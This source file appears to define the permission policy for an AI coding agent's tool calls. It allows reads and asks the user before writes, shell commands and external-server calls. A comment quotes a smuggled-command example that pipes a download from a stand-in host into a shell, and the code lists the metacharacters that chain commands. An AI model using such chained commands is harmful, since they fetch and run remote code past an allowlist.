; Policy — evaluated in the privileged handler environment, before handlers.ikr.
;
; This is the programmable part of the security story. `tool-policy` decides,
; for every jern/tool-call the agent performs, whether to :allow it, :ask the
; user first, or deny it outright with a reason string. The trace records
; every decision either way.
;
; A workspace can override these rules without touching the install: put a
; `.jern/policy.ikr` in the repo and redefine `tool-policy` (and, if you
; like, `describe-tool-call`) there — `jern policy init` writes a starting
; point. It loads right after this file, so the helpers below are in scope.
; A workspace policy runs privileged: trust it like the repo's test_command.

; --- Helpers for policy rules ------------------------------------------------

; The call's target path / shell command, or :null.
(define call-path
  (lambda (call) (plist-get (plist-get call :input) :path)))
(define call-command
  (lambda (call) (plist-get (plist-get call :input) :command)))

; Path-scoped rule: the call's :path starts with the prefix.
;   ((path-within? call "src/") :allow)
(define path-within?
  (lambda (call prefix)
    (sequence
      (define path (call-path call))
      (if (eqv? path :null) #f (string-prefix? path prefix)))))

; Shell metacharacters that would let an allowlisted prefix smuggle a second
; command past the check: "pytest -q; curl evil | sh" starts with "pytest "
; but is not a pytest invocation. command-is? refuses to auto-allow any
; command containing one — such commands fall through to :ask, not :deny.
(define command-has-shell-metacharacter?
  (lambda (command)
    (or? (string-contains? command ";")
         (string-contains? command "&")
         (string-contains? command "|")
         (string-contains? command "`")
         (string-contains? command "$(")
         (string-contains? command ">")
         (string-contains? command "<")
         (string-contains? command "\n"))))

; Command allowlist: the shell :command is `allowed` itself or `allowed`
; followed by arguments — "pytest" matches "pytest" and "pytest -q x",
; never "pytest-evil", and never a command line carrying shell
; metacharacters (; & | ` $( > < newline), which would chain extra commands
; onto the allowlisted one.
;   ((command-is? call "pytest") :allow)
(define command-is?
  (lambda (call allowed)
    (sequence
      (define command (call-command call))
      (if (eqv? command :null)
          #f
          (if (command-has-shell-metacharacter? command)
              #f
              (or? (equal? command allowed)
                   (string-prefix? command (String.concat allowed " "))))))))

; One-line description of a tool call, for approval prompts and the trace.
(define describe-tool-call
  (lambda (call)
    (sequence
      (define name (plist-get call :name))
      (define input (plist-get call :input))
      (cond ((equal? name "shell")
             (String.concat "shell: " (plist-get input :command)))
            ((equal? name "edit_file")
             ; A minimal diff preview: the exact text leaving and arriving.
             (String.concat "edit_file: "
               (String.concat (plist-get input :path)
                 (String.concat "\n  - "
                   (String.concat (plist-get input :old_string)
                     (String.concat "\n  + " (plist-get input :new_string)))))))
            ((equal? name "write_file")
             ; The full arriving content, as an all-additions diff.
             (String.concat "write_file: "
               (String.concat (plist-get input :path)
                 (String.concat "\n  + " (plist-get input :content)))))
            (#t name)))))

; The default policy: reads are free, writes and shell ask first. MCP tools
; (named mcp__<server>__<tool>) fall to the closing :ask clause — every call
; to an external server needs your approval until you say otherwise here,
; e.g. ((equal? name "mcp__github__get_issue") :allow) before the catch-all.
(define tool-policy
  (lambda (call)
    (sequence
      (define name (plist-get call :name))
      (cond ((equal? name "shell") :ask)
            ((equal? name "edit_file") :ask)
            ((equal? name "write_file") :ask)
            ((equal? name "read_file") :allow)
            ((equal? name "list_dir") :allow)
            ((equal? name "file_tree") :allow)
            ((equal? name "grep") :allow)
            (#t :ask)))))

; Intercepts jern/tool-call closest to the agent. Allowed (or approved) calls
; are re-performed, which reaches the executor handler installed outside this
; one; everything else becomes an error tool-result the agent can react to.
(define with-policy-handler
  (vau (body) env
    (prompt jern/tool-call
      (lambda (call resume-call)
        (sequence
          (define decision (tool-policy call))
          (jern/host-trace
            (list :event "policy-decision"
                  :call (describe-tool-call call)
                  :decision decision))
          (cond ((eqv? decision :allow)
                 (resume resume-call (perform jern/tool-call call)))
                ((eqv? decision :ask)
                 (if (perform jern/approve (describe-tool-call call))
                     (resume resume-call (perform jern/tool-call call))
                     (sequence
                       (jern/host-trace
                         (list :event "approval-denied"
                               :call (describe-tool-call call)))
                       (resume resume-call
                               (list :content "the user declined this action"
                                     :is_error #t)))))
                (#t (resume resume-call
                            (list :content decision :is_error #t))))))
      (eval body env))))

; Answers jern/approve by asking the host (TTY prompt, --yes, or a test stub).
(define with-approval-handler
  (vau (body) env
    (prompt jern/approve
      (lambda (description resume-approve)
        (resume resume-approve (jern/host-approve description)))
      (eval body env))))
